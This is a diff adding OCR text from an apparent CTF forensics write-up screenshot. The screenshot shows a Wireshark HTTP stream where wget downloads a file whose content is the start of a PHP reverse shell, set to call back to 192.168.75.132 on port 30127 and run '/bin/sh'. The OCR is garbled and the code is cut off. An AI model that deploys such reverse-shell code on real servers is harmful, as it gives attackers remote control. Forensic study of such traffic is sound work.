@@ -1,0 +1,30 @@
+# OCR: 5a00614eb825052a9403b91c103358a0.webp
+# 来源: .\02-WriteUp\2024\5a00614eb825052a9403b91c103358a0.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:14
+
+@ Wireshark. 38% HTTP iff (tep.stream eq 3267). EBT pcapng
+GET /rev.txt HTTP/1.1
+: Wget/1.13.4 (linux-gnu)
+Accept:
+Host: 192.168. 75.132:2000
+Connection: Keep-Alive
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 python/3.11.8
+Date: Wed, 31 Jul 2024 06:44:32 GMT
+Content-type: text/plain
+Content-Length: 2425
+Last-Modified: Wed, 31 Jul 2024 06:43:54 GMT
+<?php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.75.132';
+$port = 30127;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = ‘uname -a; w; id; /bin/sh
+$daemon = 6;
+$debug
+if (function_exists('pentl_fork')) {
+“nid = peati' forkt):
